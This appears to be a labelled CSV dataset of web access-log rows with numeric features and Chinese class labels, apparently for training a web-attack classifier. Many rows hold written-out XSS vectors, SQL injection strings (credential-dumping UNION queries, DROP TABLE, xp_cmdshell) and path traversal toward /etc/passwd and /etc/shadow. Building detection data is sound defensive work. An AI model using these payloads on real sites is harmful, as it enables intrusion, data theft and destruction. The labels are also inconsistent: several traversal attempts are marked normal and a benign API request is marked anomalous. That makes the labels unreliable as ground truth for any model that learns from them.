+8.8.8.8,20/May/2025:23:00:53 +0800,GET,/favicon.ico,304,49154,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+198.51.100.7,20/May/2025:09:15:51 +0800,GET,/css/style.css,200,28192,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+10.0.0.12,20/May/2025:10:39:59 +0800,GET,/index.html,304,7885,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+45.33.32.100,20/May/2025:17:59:09 +0800,GET,/dashboard,301,1257,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+66.249.66.1,20/May/2025:23:50:36 +0800,GET,/api/orders?status=active,200,15861,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,25,0.16,0,0,1,1,0.3559522842791986,0,正常
+172.16.0.3,20/May/2025:22:17:59 +0800,GET,/sitemap.xml,200,5085,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+10.0.0.8,20/May/2025:01:06:38 +0800,GET,/static/fonts/arial.woff,200,27116,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+198.51.100.7,20/May/2025:13:47:17 +0800,GET,/images/logo.png,200,5384,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+45.33.32.100,20/May/2025:19:12:49 +0800,GET,/contact.html,200,30830,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+1.1.1.1,20/May/2025:16:18:03 +0800,GET,/sitemap.xml,304,12814,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.12,20/May/2025:01:00:32 +0800,GET,/input?val=<iframe src=javascript:alert(1)>,500,1424,Mozilla/5.0 (compatible; Nmap Scripting Engine),43,0.18604651162790697,0,1,0,1,0.21790216986509967,1,XSS攻击
+192.168.1.10,20/May/2025:20:07:05 +0800,GET,/input?val=<iframe src=javascript:alert(1)>,403,3612,Wget/1.21.3,43,0.18604651162790697,0,1,0,1,0.21790216986509967,1,XSS攻击
+10.0.0.20,20/May/2025:11:53:45 +0800,GET,/about.html,200,3088,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+198.51.100.7,20/May/2025:01:54:11 +0800,GET,/robots.txt,304,35352,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+172.16.0.7,20/May/2025:04:02:11 +0800,GET,/about.html,301,5806,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.10,20/May/2025:23:47:06 +0800,GET,/get?file=/var/log/apache2/access.log,400,861,Wget/1.21.3,37,0.1891891891891892,0,0,0,1,0.20481172201196501,0,正常
+203.0.113.10,20/May/2025:23:39:25 +0800,GET,/static/fonts/arial.woff,200,24355,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+45.33.32.100,20/May/2025:18:28:29 +0800,GET,/about.html,200,41336,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+172.16.0.15,20/May/2025:02:58:04 +0800,GET,/api/products?page=1,301,39764,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+192.168.1.12,20/May/2025:12:46:48 +0800,GET,/load?name=..%252f..%252f..%252fetc/passwd,404,2478,Hydra/9.4,36,0.19444444444444445,0,0,0,1,0.2007618285473515,0,正常
+203.0.113.5,20/May/2025:10:07:53 +0800,GET,/js/main.js,304,16753,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+10.0.0.8,20/May/2025:13:21:33 +0800,GET,/page?q=<svg onload=alert('XSS')>,403,273,Wget/1.21.3,33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+172.16.0.7,20/May/2025:21:44:09 +0800,GET,/robots.txt,301,31251,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.15,20/May/2025:15:07:35 +0800,GET,/index.html,200,13379,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.12,20/May/2025:01:35:39 +0800,GET,/images/logo.png,200,8432,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+10.0.0.8,20/May/2025:05:52:02 +0800,GET,/page?id=1' AND (SELECT COUNT(*) FROM users)>0--,200,1808,curl/8.4.0,48,0.25,1,0,0,1,0.3791017315686891,1,SQL注入
+192.168.1.15,20/May/2025:04:03:23 +0800,GET,"/products.php?cat=1' UNION SELECT username,password FROM users--",400,2612,Wget/1.21.3,64,0.09375,1,0,0,1,0.6283709455665325,1,SQL注入
+192.168.1.11,20/May/2025:02:09:52 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,404,3143,python-requests/2.31.0,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+10.0.0.5,20/May/2025:00:37:29 +0800,GET,/..%2F..%2F..%2Fetc%2Fpasswd,404,1822,sqlmap/1.7,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+192.168.1.10,20/May/2025:02:10:08 +0800,GET,/api/data?id=1' OR 'a'='a,404,2620,curl/8.4.0,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+192.168.1.15,20/May/2025:06:01:05 +0800,GET,/js/app.js,200,20549,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+192.168.1.11,20/May/2025:21:04:14 +0800,GET,/profile?name=<script>document.cookie</script>,500,4597,curl/8.4.0,46,0.17391304347826086,0,1,0,1,0.2782187912521493,1,XSS攻击
+172.16.0.15,20/May/2025:18:06:25 +0800,GET,/category/electronics,200,20156,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.12,20/May/2025:00:25:27 +0800,GET,/..%2f..%2f..%2fetc/passwd,500,1257,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+10.0.0.20,20/May/2025:15:00:40 +0800,GET,/downloads/manual.pdf,304,9498,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+172.16.0.3,20/May/2025:04:12:49 +0800,GET,/about.html,200,40598,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+66.249.66.1,20/May/2025:09:15:50 +0800,GET,/dashboard,301,3153,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+10.0.0.20,20/May/2025:10:03:03 +0800,GET,"/products.php?cat=1' UNION SELECT username,password FROM users--",404,3801,curl/8.4.0,64,0.09375,1,0,0,1,0.6283709455665325,1,SQL注入
+114.114.114.114,20/May/2025:03:44:50 +0800,GET,/terms.html,200,25546,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.8,20/May/2025:23:18:21 +0800,GET,/..%2f..%2f..%2fetc/passwd,400,2871,curl/8.4.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+192.168.1.10,20/May/2025:22:54:34 +0800,GET,/register.html,301,27364,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+198.51.100.7,20/May/2025:10:12:48 +0800,GET,/js/main.js,200,8331,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+172.16.0.3,20/May/2025:16:49:23 +0800,GET,/category/electronics,200,27970,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+45.33.32.100,20/May/2025:17:20:51 +0800,GET,/api/notifications?unread=true,200,45902,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+172.16.0.15,20/May/2025:03:25:56 +0800,GET,/js/main.js,200,24184,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+10.0.0.20,20/May/2025:20:33:40 +0800,GET,/category/electronics,200,31381,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+45.33.32.100,20/May/2025:04:21:02 +0800,GET,/api/v2/data?limit=20&offset=0,200,49625,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+66.249.66.1,20/May/2025:01:12:21 +0800,GET,/category/electronics,200,49153,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+1.1.1.1,20/May/2025:06:53:54 +0800,GET,/index.html,200,28818,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.10,20/May/2025:14:20:12 +0800,GET,/view?id=1'; EXEC xp_cmdshell('dir');--,400,4678,Mozilla/5.0 (compatible; Nmap Scripting Engine),39,0.3076923076923077,1,0,0,1,0.481063911123328,1,SQL注入
+10.0.0.12,20/May/2025:01:17:03 +0800,GET,/api/products?page=1,200,38315,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+45.33.32.100,20/May/2025:12:17:12 +0800,GET,/css/style.css,200,17317,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+192.168.1.10,20/May/2025:17:15:51 +0800,GET,/search?q=<body onload=alert(1)>,400,1743,sqlmap/1.7,32,0.25,0,1,0,1,0.25939519289033136,1,XSS攻击
+10.0.0.20,20/May/2025:00:20:16 +0800,GET,/comment?msg=<img src=x onerror=alert(1)>,500,1643,Hydra/9.4,41,0.21951219512195122,0,1,0,1,0.26239957001406006,1,XSS攻击
+172.16.0.15,20/May/2025:02:54:43 +0800,GET,/api/notifications?unread=true,200,2982,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+10.0.0.5,20/May/2025:18:05:16 +0800,GET,/register.html,200,15152,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+192.168.1.12,20/May/2025:06:32:28 +0800,GET,/help/faq.html,200,35149,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+172.16.0.3,20/May/2025:19:53:01 +0800,GET,/js/main.js,200,13592,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+192.168.1.15,20/May/2025:20:51:58 +0800,GET,/include?page=..%c0%af..%c0%af..%c0%afetc/passwd,200,2296,Hydra/9.4,36,0.1111111111111111,0,0,0,1,0.3720467579562914,0,正常
+192.168.1.15,20/May/2025:19:33:33 +0800,GET,/blog/post-2.html,301,36790,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+172.16.0.3,20/May/2025:07:11:25 +0800,GET,/robots.txt,200,33683,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.5,20/May/2025:07:21:36 +0800,GET,/api/data?id=1' OR 'a'='a,400,1629,curl/8.4.0,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+172.16.0.7,20/May/2025:23:58:02 +0800,GET,/category/electronics,200,45148,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+198.51.100.7,20/May/2025:03:18:00 +0800,GET,/robots.txt,200,2778,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.10,20/May/2025:10:14:33 +0800,GET,/static/../../../etc/shadow,500,1620,sqlmap/1.7,27,0.2222222222222222,0,0,5,0,0.9699957818696624,1,路径遍历
+192.168.1.15,20/May/2025:05:45:49 +0800,GET,/category/clothing,200,20886,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+1.1.1.1,20/May/2025:15:29:53 +0800,GET,/blog/post-2.html,200,40044,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.12,20/May/2025:01:24:09 +0800,GET,/profile?name=<script>document.cookie</script>,200,207,Wget/1.21.3,46,0.17391304347826086,0,1,0,1,0.2782187912521493,1,XSS攻击
+203.0.113.5,20/May/2025:14:25:16 +0800,GET,/css/style.css,200,40648,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+10.0.0.8,20/May/2025:08:45:19 +0800,GET,/js/app.js,200,49175,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+114.114.114.114,20/May/2025:11:59:37 +0800,GET,/css/bootstrap.min.css,200,3365,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+8.8.8.8,20/May/2025:17:23:08 +0800,GET,/category/electronics,200,40044,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+172.16.0.7,20/May/2025:22:13:05 +0800,GET,/profile/settings,200,12506,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+198.51.100.7,20/May/2025:13:41:56 +0800,GET,/css/bootstrap.min.css,301,25888,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+10.0.0.12,20/May/2025:22:16:11 +0800,GET,/api/item?id=1; DROP TABLE users;--,200,1935,Wget/1.21.3,35,0.22857142857142856,1,0,1,1,0.585441435853197,1,SQL注入
+172.16.0.7,20/May/2025:17:39:27 +0800,GET,/js/main.js,200,42793,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+8.8.8.8,20/May/2025:11:06:16 +0800,GET,/api/search?q=phone,200,30765,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+223.5.5.5,20/May/2025:05:24:01 +0800,GET,/api/notifications?unread=true,200,1533,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+192.168.1.10,20/May/2025:04:17:02 +0800,GET,/api/notifications?unread=true,301,26402,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+10.0.0.8,20/May/2025:11:09:20 +0800,GET,/input?val=<iframe src=javascript:alert(1)>,403,3345,python-requests/2.31.0,43,0.18604651162790697,0,1,0,1,0.21790216986509967,1,XSS攻击
+203.0.113.5,20/May/2025:13:55:04 +0800,GET,/js/app.js,200,13685,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+192.168.1.12,20/May/2025:06:20:54 +0800,GET,/user?name=admin' OR '1'='1,403,4334,curl/8.4.0,27,0.2962962962962963,1,0,0,1,0.41662268419892706,1,SQL注入
+10.0.0.8,20/May/2025:00:41:31 +0800,GET,/download?file=1' UNION SELECT password FROM admin--,200,3155,python-requests/2.31.0,52,0.11538461538461539,1,0,0,1,0.3955366455843667,1,SQL注入
+10.0.0.12,20/May/2025:06:20:54 +0800,GET,/blog/post-2.html,200,16500,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+1.1.1.1,20/May/2025:18:41:45 +0800,GET,/js/app.js,200,14540,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+1.1.1.1,20/May/2025:17:53:16 +0800,GET,/profile/settings,304,45465,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+10.0.0.20,20/May/2025:11:28:10 +0800,GET,/load?name=..%252f..%252f..%252fetc/passwd,500,2814,python-requests/2.31.0,36,0.19444444444444445,0,0,0,1,0.2007618285473515,0,正常
+192.168.1.15,20/May/2025:02:23:28 +0800,GET,/api/v2/data?limit=20&offset=0,200,14621,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+172.16.0.15,20/May/2025:06:32:42 +0800,GET,/category/electronics,301,48383,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.11,20/May/2025:02:09:46 +0800,GET,/download?file=1' UNION SELECT password FROM admin--,500,2414,sqlmap/1.7,52,0.11538461538461539,1,0,0,1,0.3955366455843667,1,SQL注入
+192.168.1.10,20/May/2025:00:51:36 +0800,GET,/robots.txt,200,43751,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.20,20/May/2025:07:29:03 +0800,GET,/api/data?id=1' OR 'a'='a,400,3945,curl/8.4.0,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+203.0.113.10,20/May/2025:10:50:03 +0800,GET,/api/v2/data?limit=20&offset=0,200,16344,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+192.168.1.12,20/May/2025:21:12:37 +0800,GET,/help/faq.html,200,15776,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+203.0.113.5,20/May/2025:10:57:31 +0800,GET,/api/notifications?unread=true,304,5252,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+203.0.113.5,20/May/2025:23:35:53 +0800,GET,/terms.html,200,16037,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+172.16.0.3,20/May/2025:22:48:10 +0800,GET,/js/main.js,200,23234,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+10.0.0.20,20/May/2025:17:52:28 +0800,GET,/list?category=1 UNION ALL SELECT table_name FROM information_schema.tables--,200,1932,Wget/1.21.3,77,0.06493506493506493,1,0,0,1,0.963961862375453,1,SQL注入
+10.0.0.8,20/May/2025:07:34:56 +0800,GET,/download?file=../../../etc/passwd,200,2107,sqlmap/1.7,34,0.20588235294117646,0,0,0,1,0.2130243670859868,1,路径遍历
+203.0.113.10,20/May/2025:01:12:32 +0800,GET,/category/clothing,301,18277,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+10.0.0.5,20/May/2025:10:24:02 +0800,GET,/js/app.js,200,7804,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+192.168.1.15,20/May/2025:15:57:59 +0800,GET,/api/search?q=phone,200,46080,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+198.51.100.7,20/May/2025:12:19:50 +0800,GET,/category/electronics,200,3782,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+8.8.8.8,20/May/2025:04:52:02 +0800,GET,/api/notifications?unread=true,200,8720,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+45.33.32.100,20/May/2025:18:53:19 +0800,GET,/favicon.ico,200,48678,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+45.33.32.100,20/May/2025:12:23:24 +0800,GET,/images/logo.png,200,840,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+192.168.1.15,20/May/2025:19:21:07 +0800,GET,/static/fonts/arial.woff,301,22161,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+10.0.0.20,20/May/2025:09:59:06 +0800,GET,/read?path=....//....//....//etc/passwd,404,262,sqlmap/1.7,39,0.2564102564102564,0,0,0,1,0.2299033851549451,1,路径遍历
+192.168.1.12,20/May/2025:17:44:22 +0800,GET,/read?path=....//....//....//etc/passwd,403,1808,Wget/1.21.3,39,0.2564102564102564,0,0,0,1,0.2299033851549451,1,路径遍历
+1.1.1.1,20/May/2025:01:55:21 +0800,GET,/robots.txt,301,11543,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.12,20/May/2025:16:21:16 +0800,GET,/include?page=..%c0%af..%c0%af..%c0%afetc/passwd,500,299,curl/8.4.0,36,0.1111111111111111,0,0,0,1,0.3720467579562914,0,正常
+10.0.0.20,20/May/2025:10:30:05 +0800,GET,/api/data?id=1' OR 'a'='a,404,4680,Mozilla/5.0 (compatible; Nmap Scripting Engine),25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+10.0.0.12,20/May/2025:17:43:11 +0800,GET,/js/main.js,301,20778,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+66.249.66.1,20/May/2025:15:45:03 +0800,GET,/api/user?id=3,200,33183,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+192.168.1.11,20/May/2025:21:38:07 +0800,GET,/blog/post-1.html,200,27050,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+8.8.8.8,20/May/2025:02:44:37 +0800,GET,/js/app.js,200,40512,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+223.5.5.5,20/May/2025:13:11:38 +0800,GET,/api/notifications?unread=true,304,4822,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+10.0.0.5,20/May/2025:15:06:02 +0800,GET,/page?q=<svg onload=alert('XSS')>,404,4131,Hydra/9.4,33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+10.0.0.5,20/May/2025:15:16:53 +0800,GET,/../../../etc/passwd,403,636,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,路径遍历
+192.168.1.12,20/May/2025:00:18:00 +0800,GET,/profile/settings,301,12747,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+192.168.1.15,20/May/2025:14:56:46 +0800,GET,/register.html,200,8144,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+172.16.0.7,20/May/2025:11:35:21 +0800,GET,/js/main.js,200,40091,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
